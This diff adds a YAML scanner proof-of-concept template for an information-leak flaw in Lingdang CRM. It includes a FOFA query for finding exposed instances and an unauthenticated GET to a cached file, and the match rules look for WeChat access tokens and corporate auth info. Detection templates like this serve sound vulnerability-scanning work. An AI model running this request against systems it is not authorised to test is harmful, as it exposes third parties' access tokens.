@@ -1,0 +1,25 @@
+id: poc-yaml-51mis-crm-auth-info-info-leak
+info:
+  name: 灵当crm auth-info 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 灵当CRM
+  fofa_1: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
+    && body="ldcrm.base.js")
+requests:
+- method: GET
+  path: /crm/dataCache/weixin/auth_info.txt
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"crm\":") &&
+
+    contains(body,"access_token") &&
+
+    contains(body,"\"auth_corp_info\":") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
